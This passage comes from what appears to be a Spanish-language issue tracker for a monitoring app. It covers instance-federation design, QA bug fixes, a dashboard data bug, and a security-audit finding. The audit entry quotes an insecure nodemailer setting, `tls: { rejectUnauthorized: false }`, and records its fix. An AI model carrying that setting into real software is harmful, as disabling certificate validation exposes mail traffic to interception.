- `backend/src/infrastructure/config/env.ts` y AZ-006 (TLS/puerto configurable) como referencia para exponer un
  puerto dedicado nuevo de forma consistente con el resto del sistema.
- Evaluar libreria de PKI/mTLS para Node (ej. modulo `tls` nativo con CA propia generada al enrolar el primer par
  de instancias, o `node-forge` para emision de certificados) — no introducir un mecanismo custom de "cifrado con
  hash" que no sea TLS/mTLS real.
- La CA/llaves generadas con la libreria de PKI elegida deben persistirse (coleccion Mongo dedicada con el
  material cifrado en reposo, o un volumen Docker montado — ver como `compose.yaml`/`compose.dev.yaml` ya montan
  volumenes para `azkin-db`) en vez de regenerarse en memoria al arrancar `azkin-back`; regenerarlas en cada
  arranque invalidaria todos los certificados de pares ya emitidos.
- Diseñar el endpoint interno de sondeo (`GET /api/v1/federation/sync?since=<timestamp_utc>` o similar) para que
  acepte el cursor temporal y devuelva resultados en lote de forma paginada (no cargar en memoria horas de
  heartbeats de una sola vez si el corte fue largo).
- `backend/src/domain/value-objects/monitor-status.ts` (`MonitorStatus`/`toEventStatusLabel`) ya define los 5
  estados reales del sistema (`DOWN`/`UP`/`PENDING`/`MAINTENANCE`/`DEGRADED`). La jerarquia de severidad del
  combinado **no se inventa de nuevo**: `get-group-overview.usecase.ts` (metodo privado `combineStatus`) ya
  implementa exactamente este problema para grupos locales de monitores
  (`DOWN > DEGRADED > PENDING > MAINTENANCE > UP`) — extraer esa logica a un helper compartido
  (`domain`/`application/services`) y reutilizarlo tanto para grupos locales como para el combinado federado,
  en vez de mantener dos implementaciones de la misma regla.
- Definir esquema Mongo para `FederatedInstance` (id, nombre/etiqueta, URL/direccion de contacto, huella del
  certificado propio y del par, estado de conexion/revocacion, ultimo intercambio exitoso, umbral de "sin
  reportar" configurable, timestamps de enrollment/revocacion) y para `FederatedMonitorGroup` (id de grupo,
  lista de miembros `{instanceId, monitorId}` — reemplaza al vinculo pairwise pensado originalmente). La regla de
  severidad de la vista "Combinado" es fija (ver mas abajo), no una opcion guardada por grupo.
- Middleware de verificacion de revocacion por request (analogo al patron ya usado en `metrics-auth.ts` de AZ-010),
  aplicado tanto al endpoint de sondeo como al listado acotado de monitores: ademas de la validacion mTLS del
  handshake, cada request confirma contra Mongo que la instancia que presenta el certificado no fue revocada,
  para que la revocacion tenga efecto inmediato incluso sobre conexiones con keep-alive ya establecidas.
- Cuota de instancias federadas: seguir el mismo patron de `QuotaExceededError` (AZ-014, ya tiene su propio
  `code` distinguible) en vez de reutilizar el error generico de validacion.
- Endpoint acotado "listar mis monitores para un par federado" (solo nombre/URL/tipo), reutilizando y adaptando el
  mismo filtro de permisos de AZ-008 para no listar monitores que el propio Admin remoto no deberia poder ver.
- Reutilizar `infrastructure/notifier/multichannel-notifier.ts` (ver AZ-004/AZ-007) para la alerta de "federacion
  sin reportar", en vez de crear un sistema de notificaciones paralelo.
- Para la persistencia de resultados de pares federados, revisar como esta modelada hoy la coleccion Time-Series
  de heartbeats (`infrastructure/persistence/mongoose/repositories/mongoose-heartbeat.repository.ts` y su schema)
  y evaluar una coleccion propia (ej. `FederatedHeartbeat`) con el mismo TTL de 30 dias, en vez de mezclar datos
  de origen remoto dentro de la coleccion de heartbeats locales.
- `frontend/src/app/features/dashboard/dashboard.ts` (ya identificado como componente grande en AZ-016) para el
  grafico comparativo por region — revisar si conviene extraerlo como componente propio en vez de sumarle mas
  responsabilidad a un archivo que AZ-016 ya marco como sobrecargado.
- `backend/src/application/use-cases/reports/generate-report-data.usecase.ts` y
  `frontend/src/app/features/settings/reports-panel.ts` (ver AZ-045/AZ-047/AZ-048) para agregar la pregunta de
  "incluir instancias federadas" al formulario de creacion/edicion de informes, manteniendo "solo datos locales"
  como default para no alterar informes ya configurados.
- Revisar `docs/instalacion-docker.md` §12 (tabla de puertos) para mantener el mismo formato al documentar el
  puerto nuevo, y agregar ahi mismo la nota del limite de 5 instancias como decision de alcance (no como
  limitacion tecnica a "resolver despues").
- `docs/ARCHITECTURE.md` ya numera sus secciones de forma secuencial (la ultima es "## 13. Estado DEGRADADO..."),
  asi que la seccion de federacion entra como "## 14. Federacion de instancias" a continuacion, siguiendo el
  mismo estilo de las secciones existentes: parrafo de contexto/motivo primero, luego el detalle tecnico con
  referencias a archivos reales (`domain/entities`, `use-cases`, etc.), tal como ya hacen §12 y §13. Reutilizar el
  formato `mermaid` que ya usan las secciones 1 (arquitectura general), 2 (bypass Cloudflare) y 6 (autenticacion)
  para los diagramas de enrollment y sondeo, en vez de inventar un formato de diagrama distinto.
- `README.md`: agregar una linea nueva en "✨ Funcionalidades destacadas" (siguiendo el mismo estilo de bullet que
  las demas, ej. la de "Módulo de Mantenimiento" o "Estado DEGRADADO y monitoreo adaptativo") y no tocar la tabla
  de "📚 Documentación" salvo para verificar que el link a `docs/ARCHITECTURE.md` siga siendo valido (ya apunta al
  archivo completo, no a una seccion especifica).

---

## AZ-050) Bugs y brechas de UX encontrados en QA de la federacion de instancias (AZ-049)
- Codigo: AZ-050
- Estado: [~] En progreso — 6 rondas de bugs criticos de QA en vivo diagnosticados y corregidos
  (2026-07-24): auto-vinculacion parcial/PENDING, asimetria del grafico Multi-Nodo, borrado de
  instancia sin cascada ni aviso al par (+ gap de mesh 3+ nodos), grafico de la comparativa
  federada congelado/sin selector de rango, necesidad de F5 para ver el resultado del enrolamiento,
  y borrado que solo revocaba (no borraba) del otro lado, dejando una instancia "zombie" que
  "Reactivar" no podia recuperar de verdad. No se marca "Resuelto" hasta que el usuario confirme en
  un despliegue real con 2+ instancias (ver notas mas abajo).
- Prioridad: Alta-CRITICA
- Reportado: 2026-07-23

### Nota (2026-07-24) — bug critico encontrado en QA real: solo se importaba 1 de N monitores remotos

Reporte del usuario probando con datos reales: "en el nodo 1 tengo 3 monitoreos y solo se cargo 1
solo y sale como pendiente". Causa raiz identificada en `AutoLinkFederatedMonitorsUseCase` y
`RunFederationSyncUseCase`: el heartbeat sintetico que se inserta para que un monitor recien
importado no quede en PENDING guardaba `status` como **string** (`"UP"/"DOWN"/"DEGRADED"`), pero el
schema de Mongo define ese campo como `Number` (`enum: [0,1,2,3,4]`) — Mongoose no puede castear el
string y `heartbeats.save()` lanzaba excepcion **siempre**, tanto en la importacion inicial como en
cada sondeo periodico posterior. Como el loop de auto-vinculacion no aislaba cada monitor remoto en
su propio try/catch, esa excepcion abortaba el resto del lote: de ahi que solo se importara el
primer monitor (con heartbeat roto) y los demas se perdieran en silencio. Ademas, un monitor remoto
tipo `port` (TCP) no podia importarse nunca porque el catalogo remoto no exponia el numero de puerto
(campo requerido por el schema para ese tipo), y un remoto en estado DOWN (valor numerico 0) no
inicializaba su heartbeat porque el codigo lo evaluaba con `if (status)`, que trata 0 como falso.
Corregido: (1) `status` ahora se guarda como el enum numerico real, nunca un string; (2) el loop de
auto-vinculacion procesa cada monitor remoto en su propio try/catch (mismo patron que
`RunFederationSyncUseCase`), asi que uno invalido ya no tumba al resto del lote; (3) el catalogo de
monitores remotos (`GET /federation/peer/monitors`) ahora incluye `port` para poder recrear
monitores tipo TCP; (4) la comparacion de status remoto ya no usa `if (valor)` sino una comparacion
explicita contra `null`/`undefined`, asi que DOWN (0) tambien inicializa el heartbeat. Cubierto con
4 tests nuevos (`auto-link-federated-monitors.usecase.test.ts`,
`run-federation-sync.usecase.test.ts`) que reproducen exactamente el escenario reportado (3 remotos,
1 con datos incompletos) contra el tipo real del campo `status`, no solo contra un mock permisivo —
los tests anteriores no detectaban el bug porque el repositorio falso de heartbeats no validaba
tipos como Mongo real.

### Descripcion
Sesion de QA sobre la implementacion ya construida de la federacion de instancias (AZ-049, slices
1-3), probada con dos instancias reales por el usuario. Se encontraron 5 problemas: algunos son
bugs de implementacion respecto al diseño ya documentado en AZ-049, y otros son brechas entre ese
diseño (ya deliberado y documentado) y la expectativa del usuario — se listan por separado para no
mezclar ambos tipos. Esta issue es solo de analisis; no se toco codigo durante la sesion que la
origino.

### Comportamiento esperado
1. **Boton "Copiar" del codigo de enrollment.** Al generar el token de invitacion (`onCreateToken()`
   en `federation-panel.ts`), el boton "Copiar" debe copiar el codigo al portapapeles y mostrar
   confirmacion visual. Hoy no copia nada ni da ningun feedback de exito/error — bug de
   implementacion, reproducible siempre, que obliga a seleccionar/copiar el texto a mano.
2. **Paso de aprobacion al recibir un enrollment.** El usuario esperaba que, al usarse su codigo en
   otra instancia, la instancia que lo genero mostrara una notificacion de "alguien intenta
   conectarse" con opcion de aceptar/rechazar, agregandose la conexion sola solo si se acepta. El
   diseño ya documentado en AZ-049 (`AcceptEnrollmentUseCase`, "Modelo de confianza deliberadamente
   simple") es intencionalmente "todo o nada": la sola posesion del token de un solo uso ya
   autoriza el enrollment, sin paso manual adicional. Esto **no es un bug** respecto al diseño ya
   acordado, pero es una brecha real frente a la expectativa del usuario — pendiente decidir si
   AZ-049 debe revisarse para sumar un paso de confirmacion manual, o si se deja documentado
   explicitamente como decision aceptada (con su tradeoff de UX vs. friccion operativa).
3. **"Explorar monitores" debe mostrar el catalogo de la instancia par.** Probado en una instancia
   recien enrolada, sin monitores propios, contra un par con 3 monitores configurados — la lista
   remota (`GET /federation/instances/:id/remote-monitors`) no mostro ningun monitor. Confirmado una
   sola vez por el usuario; falta verificar si es reproducible siempre o intermitente antes de
   diagnosticar la causa.
4. **El selector "Por region / Combinado" debe aparecer en el detalle de un monitor vinculado.** El
   componente `federated-comparison.ts` no se mostro en ningun monitor durante la prueba. Posible
   consecuencia directa del punto 3 (sin vinculos de monitor creados, no hay nada que comparar) — a
   confirmar una vez resuelto el punto 3 y con al menos un vinculo activo.
5. **El formulario "Probar conectividad" no debe proponer un puerto obsoleto.** Sigue trayendo por
   defecto el puerto `8444`, remanente del modelo de puerto mTLS dedicado que la slice 3 de AZ-049
   (2026-07-23) elimino — hoy la federacion corre sobre el mismo puerto que la API/dashboard. Puede
   confundir al Admin al probar conectividad contra un puerto que ya no aplica.

### Criterios de aceptacion
1. El boton "Copiar" del codigo de enrollment copia el valor correcto al portapapeles y muestra
   confirmacion visual, verificado en navegador.
2. Se toma y documenta una decision explicita sobre el punto 2 (mantener "todo o nada" como esta, o
   agregar un paso de aceptacion manual del lado receptor) — no debe quedar como ambigüedad
   implicita entre AZ-049 y esta issue.
3. "Explorar monitores" muestra el catalogo real de la instancia par (nombre/URL/tipo) apenas hay un
   enrollment activo, sin necesidad de que la instancia local tenga monitores propios.
4. El selector "Por region / Combinado" aparece en el detalle de todo monitor que tenga al menos un
   vinculo activo con otra instancia federada.
5. El formulario de "Probar conectividad" ya no propone `8444` (u otro puerto dedicado) como valor
   por defecto.

### Pistas de investigacion
- `frontend/src/app/features/settings/federation-panel.ts`: `onCreateToken()` (boton copiar),
  formulario de "Probar conectividad" (puerto por defecto), pantalla "Explorar monitores"
  (`onCreateLink`, listado de monitores remotos).
- `backend/src/infrastructure/http/routes/federation.routes.ts` y
  `GET /federation/instances/:id/remote-monitors` para el punto 3 — revisar filtro de permisos
  (AZ-008) y si el enrollment recien creado ya tiene todos los datos que ese endpoint necesita.
- `backend/src/application/use-cases/federation/accept-enrollment.usecase.ts` como punto de partida
  si se decide agregar un paso de aprobacion manual (punto 2) — hoy autoriza solo por posesion del
  token.
- `frontend/src/app/shared/components/federated-comparison.ts` para el punto 4 — confirmar si el
  componente no se renderiza por falta de vinculos (efecto de AZ-050.3) o por un bug propio en la
  condicion que decide mostrarlo.
- Ver AZ-049 (seccion "Progreso slice 2" y "slice 3") para el contexto completo de diseño de la
  federacion antes de tocar cualquiera de estos puntos.

### Nota (2026-07-24, segunda ronda) — 3 hallazgos de QA en vivo con 2 nodos reales, corregidos

1. **El grafico/comparativa Multi-Nodo solo aparecia del lado que importo el monitor, no del lado de
   origen.** Causa: `FederatedMonitorLink` se ancla solo en el monitor LOCAL de quien crea el vinculo
   (diseño deliberado de AZ-049, "pares, no grupo con id sincronizado"), y los dos `autoLink` (uno por
   cada lado, disparados por callbacks independientes al enrolar) corren en paralelo sin coordinacion
   — si el lado B importa un monitor de A antes de que el propio auto-link de A alcance a ver la copia
   de B en el catalogo remoto, A se queda sin vinculo propio para siempre (no hay reintento
   automatico). Corregido: al crear un vinculo por auto-vinculacion, la instancia que importa ahora
   avisa al par vía un nuevo endpoint P2P (`POST /federation/peer/links`,
   `RegisterPeerMonitorLinkUseCase`) para que este cree su propio vinculo reciproco de inmediato, sin
   depender de que su propio ciclo de descubrimiento alcance a correr despues. Cubierto con test en
   `auto-link-federated-monitors.usecase.test.ts` y `register-peer-monitor-link.usecase.test.ts`.
2. **Borrar una instancia federada no eliminaba los monitores auto-importados desde ella, y el otro
   nodo no se enteraba.** `DeleteFederatedInstanceUseCase` solo borraba el registro de la instancia y
   sus `FederatedMonitorLink`, dejando huerfanos los monitores creados por auto-vinculacion (ya
   indistinguibles de uno manual). Corregido: (a) los monitores llevan ahora una marca de origen
   (`Monitor.importedFromFederatedInstanceId`, seteada solo al crear un monitor nuevo por
   auto-vinculacion — nunca cuando el auto-link solo hizo *match* con un monitor manual preexistente
   por nombre/target) y `DeleteFederatedInstanceUseCase` borra en cascada (reutilizando
   `DeleteMonitorUseCase`, con su propio borrado de heartbeats y desagendamiento) solo esos monitores;
   (b) al eliminar, se notifica al par remoto (mismo mecanismo P2P que ya usaba "Revocar",
   `notifyRevocation`) para que su lado tambien marque la federacion como terminada de inmediato, en
   vez de seguir sondeando un vinculo muerto indefinidamente. Cubierto con test nuevo en
   `delete-federated-instance.usecase.test.ts`.
3. **Pregunta (no bug): si Google cae en el Nodo 1 pero sigue arriba en el Nodo 2, ¿como se ve eso
   claramente?** Ya esta resuelto por la vista "Por Nodo" (`federated-comparison.ts`): cada nodo
   (local + cada region) tiene su propia tarjeta con `<app-badge-status>`, que muestra una pildora
   roja pulsante "CAIDO" para DOWN vs. una pildora verde "OPERATIVO" para UP — no hay que interpretar
   el grafico, cada tarjeta ya dice explicitamente el estado de ESE nodo especifico. No requirio
   cambio de codigo, solo confirmacion.

Validado con `tsc --noEmit` (backend) y la suite completa de tests del backend (234/234). Sigue
pendiente la verificacion en vivo del usuario con los 2 nodos reales para estos 2 fixes nuevos.

### Nota (2026-07-24, tercera ronda) — alcance exacto de "borrar" confirmado + gap de mesh 3+ nodos corregido

Pregunta del usuario para confirmar el alcance con topologia de 3-4 nodos: al borrar la federacion
en el Nodo 2 (ej. su vinculo con el Nodo 1), ¿se avisa solo al Nodo 1 o "a los demas" (Nodo 3, Nodo
4)? Confirmado y verificado contra el codigo: **solo al par especifico que se esta borrando**. Cada
enrollment es independiente (par a par, ver AZ-049) — borrar la federacion Nodo2↔Nodo1 no notifica,
no revoca ni toca en absoluto la federacion Nodo2↔Nodo3 ni Nodo2↔Nodo4, que siguen funcionando con
sus propios datos intactos. Igualmente confirmado: si un nodo simplemente se cae/apaga (no se borra
la federacion), no se elimina nada — eso ya era el comportamiento existente (`RunFederationSyncUseCase`
solo marca "sin datos de [instancia] desde [hora]" tras el umbral configurado y notifica, sin borrar
ni revocar).

Al verificar este alcance se encontro un gap real en el fix de la ronda anterior: si un monitor
auto-importado desde el Nodo 1 tambien quedo vinculado a un tercer nodo (Nodo 3) como parte del mismo
grupo de monitoreo equivalente (topologia de malla completa), borrar la federacion con el Nodo 1
borraba el monitor pero dejaba huerfano el `FederatedMonitorLink` hacia el Nodo 3 (apuntando a un
`localMonitorId` que ya no existe). Corregido en `DeleteFederatedInstanceUseCase`: antes de borrar
cada monitor auto-importado, se limpian primero todos sus vinculos con cualquier otra instancia
federada, no solo con la que se esta eliminando. Cubierto con test nuevo en
`delete-federated-instance.usecase.test.ts`. Suite completa: 235/235.

### Nota (2026-07-24, cuarta ronda) — grafico de la comparativa federada "congelado" + sin selector de rango

Reporte del usuario (con capturas): el mismo monitor "anime" se ve con un historial rico en el Nodo
1 (donde es el monitor original) pero con el grafico colapsado (una sola marca de tiempo en el eje
X, linea vertical en vez de una curva) en el Nodo 2 (donde se auto-importo). Causa raiz doble:

1. **El panel `federated-comparison.ts` solo pedia datos una vez al abrir el monitor** (`effect()`
   sobre `monitorId()`, sin ninguna actualizacion periodica ni suscripcion en vivo) — a diferencia
   del grafico principal de latencia, que si se actualiza con cada heartbeat nuevo por Socket.IO. Si
   en ese primer pedido el monitor recien importado en el Nodo 2 todavia tenia 1 o 2 heartbeats
   reales propios, el panel quedaba congelado con ese snapshot escaso para siempre mientras siguiera
   montado, sin importar cuanto tiempo pasara ni cuantos checks nuevos se acumularan.
2. **No existia forma de pedir una ventana de tiempo mas amplia u otra** — a diferencia del grafico
   principal (`historyRangeOptions`: 5m/30m/1h/3h/6h/12h/24h/48h/7d/30d), la comparativa federada
   tenia el historial local fijo en 30 min y el historial remoto fijo en los ultimos 20 registros
   (un limite de cantidad, no de tiempo), sin selector ni forma de cambiarlo desde la UI.

Corregido: (a) el panel ahora se refresca automaticamente cada 30s mientras esta montado (ademas de
al abrir el monitor o cambiar el rango), asi el grafico deja de quedar congelado y va reflejando el
historial real a medida que se acumula; (b) se agrego el mismo selector de rango 5m/30m/.../30d que
ya usa el grafico principal, tanto en el backend (`GetFederatedComparisonUseCase` y
`GET /federation/comparison/:monitorId?rangeMs=<ms>` aceptan la ventana; `IFederatedHeartbeatRepository.findHistory`
paso de "ultimos N registros" a "ultima ventana de tiempo", igual criterio que el historial local)
como en el frontend (`federated-comparison.ts`). Cubierto con test nuevo en
`get-federated-comparison.usecase.test.ts` que verifica que el rango se reenvia a ambos
repositorios de historial (local y federado). Suite completa: 236/236, `ng build` limpio.

**Sobre "borré la federación del Nodo 2 y en el Nodo 1 no pasó literalmente nada":** se re-revisó
todo el flujo (`DeleteFederatedInstanceUseCase` → `IFederationClient.notifyRevocation` →
`POST /federation/peer/notify-revocation` → `verifyPeerSecret` → `federatedInstancesRepository.revoke`)
y esta correctamente encadenado y con el mismo cableado que ya usa "Revocar" (que sí se confirmó
funcionando). No se encontró ningún bug adicional en el código en esta revisión. Este fix se agregó
recién en la ronda anterior de esta misma sesión — lo más probable es que la prueba se haya hecho
contra un `azkin-back` que todavía no se había reconstruido con este cambio en alguno de los dos
nodos, o contra una instancia que ya estaba "Revocada" de una prueba anterior (revocar dos veces no
cambia nada visible). Pendiente: reconstruir **ambos** contenedores `azkin-back` y repetir la prueba
con un par de instancias que no se haya tocado antes con "Revocar"; si sigue sin funcionar, revisar
el log del Nodo 1 al momento del borrado (debería aparecer `FEDERATION_INSTANCE_REVOKED` en la
auditoría, o el mensaje de error `[Federation] No se pudo avisar la eliminación...` en el Nodo 2 si
la llamada de red falló).

### Nota (2026-07-24, quinta ronda) — había que hacer F5 en los dos nodos para ver el resultado del enrolamiento

Reporte del usuario: después de enrolar y auto-vincular, para confirmar que todo quedó bien había
que recargar la página (F5) en ambos nodos — los monitores importados y los vínculos nuevos no
aparecían solos. Causa raíz con 3 gaps distintos, ninguno cubierto por el evento
`federation:enrolled` que ya existía (AZ-050 punto 9 original):

1. **Se dispara demasiado temprano.** `federation:enrolled` se emite en el momento en que se crea el
   registro de la instancia federada, pero la auto-vinculación real (que crea los monitores y
   vínculos) corre *después*, en segundo plano — para cuando el toast aparece y refresca la UI, típicamente
   todavía no hay nada que mostrar. No existía ningún evento posterior que avisara cuando la
   auto-vinculación de verdad terminaba.
2. **La llamada HTTP de "Auto-vincular" no refrescaba los monitores.** `FederationService.autoLinkMonitors()`
   solo recargaba `links`, nunca `monitorService.monitors()` — un monitor recién importado quedaba
   invisible en el sidebar aunque el vínculo ya se viera.
3. **El nuevo registro recíproco de vínculo (ver ronda anterior) es 100% invisible para el otro
   lado.** Cuando un nodo le avisa al otro para que cree su vínculo de vuelta
   (`POST /federation/peer/links`), esa creación ocurre enteramente backend-a-backend, sin ningún
   aviso al navegador del Admin del lado receptor.

Corregido: se agregó un evento nuevo, `federation:links-updated` (`IRealtimePublisher.publishFederationLinksUpdated`),
emitido desde `AutoLinkFederatedMonitorsUseCase` (solo cuando efectivamente se creó algún vínculo
nuevo) y desde `RegisterPeerMonitorLinkUseCase` (hacia el Admin del lado que recibe el registro
recíproco); el frontend (`realtime.service.ts`) lo escucha y refresca instancias, vínculos y
monitores sin toast adicional (el toast de "instancia lista" ya lo dio `federation:enrolled`).
Además, `onAutoLink()` en `federation-panel.ts` ahora también recarga `monitorService` directamente
tras su propia respuesta HTTP, sin depender del socket. Cubierto con 3 tests nuevos. Suite completa:
239/239, `tsc --noEmit` y `ng build` limpios en ambos lados.

### Nota (2026-07-24, sexta ronda) — borrar de un lado solo revocaba (no borraba) del otro; "Reactivar" no tenia efecto real

Reporte del usuario: "borré la conexión del nodo 2 y no se borró lo que venía del nodo 2 en el nodo
1 [...] le puse reactivar y no pasó literalmente nada [...] si borro de 1 lado debe borrarse del
otro". Confirmado: la ronda anterior (tercera) solo implementó que borrar en un lado **revocara**
(no borrara) la copia del otro lado — dejando ahí una instancia "zombie" con status `revoked`, sus
propios monitores auto-importados intactos (sin limpiar) y un botón "Reactivar" que, aunque
funcionaba (volvía a poner `status: enrolled` localmente), no tenía ningún efecto útil: el otro
lado ya había borrado por completo su registro de esa federación, así que cualquier request
posterior (sondeo, "Probar conexión", etc.) seguía fallando con 401 porque `verifyPeerSecret` ya no
encontraba ninguna instancia activa que coincidiera con ese secreto — de ahí "no pasó literalmente
nada" pese a que el botón en sí no estaba roto.

Corregido: se agregó un endpoint P2P nuevo, `POST /federation/peer/notify-deletion`
(`FederationPeerController.notifyDeletion`), distinto de `notify-revocation` (que sigue existiendo
tal cual, sin cambios, para la acción separada y deliberadamente reversible "Revocar"). Al borrar,
`DeleteFederatedInstanceUseCase` ahora llama a `IFederationClient.notifyDeletion` (antes llamaba a
`notifyRevocation`); el lado receptor ejecuta esa misma clase `DeleteFederatedInstanceUseCase` — la
cascada completa de borrado (instancia + vínculos + monitores auto-importados, incluyendo la
limpieza de vínculos huérfanos en otras federaciones ya cubierta en la tercera ronda) — pero
instanciada **sin** cliente/clave de federación (`handlePeerFederationDeleted` en
`composition-root.ts`), para que no vuelva a notificar hacia afuera y genere un ping-pong infinito
entre ambos nodos. También avisa por Socket.IO (`federation:links-updated`, reutilizado de la quinta
ronda) para que la UI del lado receptor se entere sin F5. Cubierto con 2 tests nuevos
(`delete-federated-instance.usecase.test.ts`). Suite completa: 241/241, `tsc --noEmit` limpio en
ambos lados (no se tocó frontend en esta ronda — el comportamiento ya funciona con el código
existente, `loadInstances()` deja de listar la instancia borrada apenas llega el evento).

---

## AZ-051) Datos inconsistentes en el detalle de monitor: "Ultimo chequeo: Nunca" pese a tener historial real, y "100% Operativo" fijo sobre bloques caidos

- Codigo: AZ-051
- Estado: [x] Resuelto (2026-07-24)
- Prioridad: Alta
- Reportado: 2026-07-24

### Descripcion

Reporte del usuario (con captura) sobre el monitor "Certvault" (`https://certvault.netics.corp/`,
dominio corporativo interno, no federado — no relacionado con AZ-049/AZ-050): el detalle mostraba
`CAÍDO`, `Latencia actual`/`Latencia promedio` en `--`, `Uptime 24h: 63.96%` (un numero real y no
redondo) y `Último chequeo: Nunca` al mismo tiempo — y mas abajo, "Historial de Disponibilidad"
mostraba 30 bloques color rosa (= DOWN) bajo una etiqueta fija "100% Operativo" en verde. El usuario
ademas verifico en su navegador que el sitio esta vivo y responde normalmente.

Se investigo el codigo (no solo se asumio) y se encontraron 2 bugs de UI/datos concretos,
independientes entre si, ademas de una explicacion probable para el falso-DOWN:

1. **`lastCheckedAt` nunca existia en el contrato del backend.** `HeartbeatSummary` (el objeto que
   arma `GET /api/v1/monitors` con el resumen de cada monitor) tenia `lastStatus`, `lastPing`,
   `uptime24h`, `lastErrorMsg` — pero ningun campo de "ultima vez chequeado". El frontend ya leia
   `monitor.lastCheckedAt` y mostraba "Nunca" cuando venia `undefined`, que era **siempre**, sin
   importar cuanto historial real tuviera el monitor — la unica vez que se poblaba era si llegaba un
   heartbeat en vivo por Socket.io mientras la pestaña estaba abierta (dato que se perdia al
   recargar). Por eso `Uptime 24h: 63.96%` (dato real, agregado de los ultimos 24h) convivia con
   `Último chequeo: Nunca` (campo que ni siquiera viajaba por HTTP).
2. **La etiqueta "100% Operativo" era texto estatico**, sin ninguna relacion con los bloques de
   `uptimeBlocks()` dibujados debajo — por eso decia 100% con los 30 bloques en rosa (DOWN real, no
   "sin datos": ese color solo lo usa el sistema para DOWN, `zinc-800` es el gris de "sin datos").
   Ademas, la carga del historial (`getHistory()`) no tenia manejador de error: si esa request
   fallaba, `historyPoints` quedaba vacio para siempre en silencio, y `uptimeBlocks()` interpreta
   "sin puntos" como "repetir el status actual del monitor en los 30 bloques" — fabricando un
   heatmap que parece datos reales pero podria no serlo.
3. **Posible causa del falso-DOWN en si (no un bug de codigo, a confirmar por el usuario):** el
   checker HTTP (`http.checker.ts`) no tiene ningun manejo especial de DNS interno/corporativo — usa
   `fetch()` directo, sin resolver custom. Un dominio `*.netics.corp` (zona interna, no resoluble por
   DNS publico) fallaria dentro del contenedor `azkin-back` con `getaddrinfo ENOTFOUND
   certvault.netics.corp`, que el checker guarda tal cual en `lastErrorMsg`/`msg` y trata como un
   DOWN mas — indistinguible de una caida real. El fallback de reintento por `host.docker.internal`
   (`same-host-fallback.ts`) no cubre este caso: solo reacciona a
   `ECONNREFUSED`/`ETIMEDOUT`/`ENETUNREACH`/`EHOSTUNREACH`, nunca a `ENOTFOUND`. Esto explicaria que
   el sitio se vea "vivo" desde el navegador del usuario (con DNS/VPN corporativo) pero "caido" desde
   el contenedor (sin acceso a esa zona DNS interna) — a confirmar revisando el mensaje real en la
   tabla de "revisiones recientes" del detalle del monitor (mas abajo en la pagina); si dice
   `getaddrinfo ENOTFOUND ...`, es un tema de red/DNS del contenedor, no un bug de Azkin ni una caida
   real del sitio. Ver "Pistas de investigacion" para la mitigacion (agregar el DNS corporativo al
   contenedor).

### Comportamiento esperado

1. "Último chequeo" muestra la fecha/hora real del ultimo heartbeat registrado (de cualquier estado),
   no "Nunca", para todo monitor con historial existente — persistente entre recargas, no solo
   mientras llegan heartbeats en vivo por socket.
2. La etiqueta junto a "Historial de Disponibilidad" refleja el porcentaje real de los 30 bloques
   mostrados (excluyendo bloques sin dato/en mantenimiento del calculo, mismo criterio que
   `uptime24h`), nunca un "100%" fijo.
3. Si la carga del historial de latencia falla (error de red/servidor), el usuario ve un aviso en vez
   de que el heatmap fabrique en silencio 30 bloques repitiendo el status actual del monitor.

### Criterios de aceptacion

1. `GET /api/v1/monitors` incluye `lastCheckedAt` (ISO 8601 o `null`) por monitor, poblado desde el
   timestamp del ultimo heartbeat real.
2. El detalle de un monitor con heartbeats reales en las ultimas 24h ya no muestra "Nunca" al
   recargar la pagina (sin depender de un heartbeat en vivo por socket).
3. La etiqueta de porcentaje sobre "Historial de Disponibilidad" cambia de color/valor segun los
   bloques reales (verde >=99%, naranja 50-99%, rojo <50%), y muestra "Sin datos" en vez de un
   porcentaje inventado cuando no hay bloques con dato real.
4. Un fallo al cargar `getHistory()` dispara un aviso visible (toast) en vez de fallar en silencio.

### Pistas de investigacion

- `backend/src/application/ports/repositories/heartbeat-repository.ts` (`HeartbeatSummary`),
  `backend/src/infrastructure/persistence/mongoose/repositories/mongoose-heartbeat.repository.ts`
  (`getSummaries()`), `backend/src/infrastructure/http/presenters/monitor.presenter.ts`
  (`toMonitorResponse`) — cadena completa que ahora expone `lastCheckedAt`.
- `frontend/src/app/features/dashboard/dashboard.ts`: `uptimeBlocks()`, `uptimeBlocksPercent()`
  (nuevo), y el `subscribe` de `getHistory()` en `selectMonitor()` (ahora con `error:`).
- Para el falso-DOWN por DNS interno (punto 3 de la Descripcion, no verificado aun con el usuario):
  revisar `lastErrorMsg`/la tabla de revisiones recientes del monitor "Certvault" buscando
  `ENOTFOUND`; si se confirma, la mitigacion es de despliegue, no de codigo — agregar el DNS
  corporativo interno al contenedor `azkin-back` (directiva `dns:` en `compose.yaml`/`compose.dev.yaml`),
  ya que el contenedor no hereda automaticamente la resolucion DNS interna que si tiene la maquina
  del usuario (por VPN/LAN corporativa).

---

## AZ-052) Auditoria de seguridad: bypass de validacion de certificado TLS en el envio de alertas por email

- Codigo: AZ-052
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Media
- Reportado: 2026-07-24

### Progreso (2026-07-27)

Corregido: `MultichannelNotifier.sendEmail()` (`multichannel-notifier.ts`) ya no pasa
`tls: { rejectUnauthorized: false }` de forma incondicional — el transporte de `nodemailer` usa
ahora el default seguro (`rejectUnauthorized: true`), igual que `smtp-mailer.ts`. No se implementó
el punto opcional de exponer un `smtpIgnoreTls` por canal (marcado como "(Opcional)" en el propio
criterio de aceptación) — queda como mejora futura si algún Admin necesita de verdad un relay SMTP
autofirmado. Verificado por lectura de código (el test existente no mockea `nodemailer`, agregar un
mock solo para este caso no aportaba señal adicional); suite completa 268/268.

### Descripcion

Auditoria de seguridad solicitada por el usuario sobre todo el codigo del proyecto (no un diff
puntual). Se uso un proceso de 3 fases (investigacion de patrones establecidos en el propio repo →
analisis comparativo del codigo cambiado contra esos patrones → evaluacion de explotabilidad),
seguido de una segunda pasada de verificacion independiente por hallazgo para descartar falsos
positivos, exigiendo evidencia concreta (archivo:linea) y un puntaje de confianza >=8/10 antes de
reportar cualquier cosa. De varios candidatos evaluados, **uno solo** paso ese umbral (otro, sobre
falta de validacion Zod en un endpoint P2P de federacion, se descarto explicitamente: cada campo ya
esta protegido rio abajo por `Types.ObjectId.isValid()` y el cast de esquema de Mongoose, sin
ninguna ruta de explotacion real):

`MultichannelNotifier.sendEmail()` (usado para las alertas UP/DOWN/DEGRADADO por canal de
notificacion de tipo email) crea el transporte de `nodemailer` con
`tls: { rejectUnauthorized: false }` de forma **incondicional** — sin ningun toggle de
Admin, sin gate de entorno test/dev, y sin relacion con el campo `smtpSecure` (que solo controla
